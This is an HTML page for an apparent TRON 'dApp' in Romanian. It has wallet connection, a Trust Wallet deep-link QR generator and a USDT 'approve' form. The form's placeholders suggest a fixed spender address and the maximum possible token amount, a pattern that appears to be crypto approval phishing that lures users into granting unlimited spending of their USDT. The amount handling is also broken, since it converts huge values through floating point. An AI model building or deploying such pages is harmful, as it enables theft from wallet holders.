<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>TRON PRO dApp</title>

<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>

<style>
body{font-family:system-ui;margin:20px;background:#f7f9fc}
.card{background:#fff;padding:16px;border-radius:10px;margin-bottom:12px}
input{width:100%;padding:10px;margin:6px 0;border-radius:8px;border:1px solid #ddd}
button{padding:10px 14px;border:0;border-radius:8px;background:#111827;color:#fff;cursor:pointer}
pre{background:#f3f4f6;padding:10px;border-radius:8px;overflow:auto}
.status{padding:6px 10px;border-radius:999px;background:#fee2e2;display:inline-block}
.ok{background:#d1fae5}
canvas{margin-top:10px}
</style>
</head>

<body>

<div class="card">
<h2>TRON PRO dApp</h2>

<div id="status" class="status">Deconectat</div>
<p>Wallet: <b id="addr">—</b></p>

<button onclick="connect()">Connect Wallet</button>
</div>

<div class="card">
<h3>QR Open dApp (Trust Wallet)</h3>

<button onclick="generateQR()">Generează QR</button>
<canvas id="qr"></canvas>

<pre id="link"></pre>
</div>

<div class="card">
<h3>TRC20 Approve (USDT)</h3>

<input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
<input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>

<button onclick="approve()">Approve</button>

<pre id="out"></pre>
</div>

<script>

const USDT = "TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
let addr = null;

/* =========================
   CONNECT TRON WALLET
========================= */
function connect(){
  if(!window.tronWeb || !window.tronWeb.defaultAddress.base58){
    alert("Deschide în Trust Wallet sau TronLink dApp browser");
    return;
  }

  addr = window.tronWeb.defaultAddress.base58;

  document.getElementById("addr").innerText = addr;
  document.getElementById("status").innerText = "Conectat";
  document.getElementById("status").classList.add("ok");
}

/* =========================
   QR GENERATOR (FIX REAL)
   Trust Wallet deep link
========================= */
function generateQR(){

  const dapp = "https://d-app-lake-theta.vercel.app";

  const deepLink =
    "https://link.trustwallet.com/open_url?coin_id=195&url=" +
    encodeURIComponent(dapp);

  QRCode.toCanvas(document.getElementById("qr"), deepLink);

  document.getElementById("link").innerText = deepLink;
}

/* =========================
   CONTRACT
========================= */
async function getContract(){
  return await window.tronWeb.contract().at(USDT);
}

/* =========================
   APPROVE
========================= */
async function approve(){
  try{

    const spender = document.getElementById("spender").value;
    const amount = document.getElementById("amount").value;

    if(!spender || !amount){
      document.getElementById("out").innerText = "Completează câmpurile";
      return;
    }

    // USDT = 6 decimals
    const value = BigInt(Math.floor(Number(amount) * 1e6));

    const c = await getContract();

    const tx = await c.approve(spender, value.toString()).send();

    document.getElementById("out").innerText =
      "Approve TX:\n" + tx;

  }catch(e){
    document.getElementById("out").innerText =
      "Eroare / user a refuzat";
  }
}

</script>

</body>
</html>
